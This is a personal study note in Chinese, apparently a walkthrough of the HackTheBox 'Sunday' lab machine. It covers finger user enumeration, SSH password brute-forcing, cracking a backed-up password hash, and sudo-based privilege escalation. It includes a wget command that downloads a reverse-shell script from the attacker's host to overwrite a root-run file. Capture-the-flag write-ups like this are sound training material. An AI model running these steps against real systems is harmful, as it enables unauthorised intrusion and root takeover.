---
UID: 20250615220640
aliases: 
tags:
  - 打靶
  - 靶场
  - hackthebox
source: 
cssclasses: 
created: 2025-06-15
---
[[htb sunday 思]]
## 扫描端口
![image.png](https://s2.loli.net/2025/06/19/noYeaqSxQ2c3bHk.png)

### 详细版
![image.png](https://s2.loli.net/2025/06/19/6BjF9EciKayS1Ye.png)

![image.png](https://s2.loli.net/2025/06/19/aMUuvNsAw5rcke9.png)


发现是有个 finger 和 http 还有 ssh 服务。问题来了，http 服务约等于没有，无法访问。只能看看 finger 有什么可以利用的吗

## finger 信息收集
搜了一下资料，发现是这么用的
![image.png](https://s2.loli.net/2025/06/19/7aGWS61tfkogBMw.png)


看了 wp，找了一个网上枚举 finger 用户名的脚本
```
./finger-user-enum.pl -U /root/seclists/Usernames/Names/names.txt -t 10.10.10.76
```

![image.png](https://s2.loli.net/2025/06/19/15Wl8UmyoNxtfLZ.png)

枚举出很多用户，用这几个用户进行爆破密码

![image.png](https://s2.loli.net/2025/06/19/BLvTqyCicuR5JHg.png)

ssh 登录一下
![image.png](https://s2.loli.net/2025/06/19/v19usSjOMFk8YIf.png)

## 提权
![image.png](https://s2.loli.net/2025/06/19/iLzPcg7hHAV5IMw.png)

发现有个 troll 可以进行不用密码使用 root 权限

先信息收集一下
![image.png](https://s2.loli.net/2025/06/19/cDsKTZPfX1HUymh.png)


用 linpeas 并没有找到啥东西

碰碰运气 搜搜 backup 文件

![image.png](https://s2.loli.net/2025/06/19/VrwuotHD4fY2mkR.png)

进去看看
![image.png](https://s2.loli.net/2025/06/19/S5EXIvHNuxlyjbz.png)

破解一下 sammy 的密码
![image.png](https://s2.loli.net/2025/06/19/cS3AIv4pFjYNXKW.png)

![image.png](https://s2.loli.net/2025/06/19/LEBrfAleXP6TZhO.png)

![image.png](https://s2.loli.net/2025/06/19/sHGqehImrD8fbav.png)

找到密码

## 切换用户继续
![image.png](https://s2.loli.net/2025/06/19/jedxMyg8JZNDO1h.png)

```
sudo wget --input-file /root/root.txt
```
用这个命令即可得到 flag
![image.png](https://s2.loli.net/2025/06/19/48IOhKas17bGeYF.png)


## 提权！
不仅仅是要 flag，我们目的是 root 权限

在 summy 用户中发现了有个不用密码就能使用 root 权限的文件
![image.png](https://s2.loli.net/2025/06/19/6tZozKAv8ylEV1f.png)

```
wget http://10.10.16.12:8001/shell.py -O /root/troll
```

![image.png](https://s2.loli.net/2025/06/19/TPF2UfRbOVxE9Gk.png)

写入一个反弹 shell 来代替/root/troll

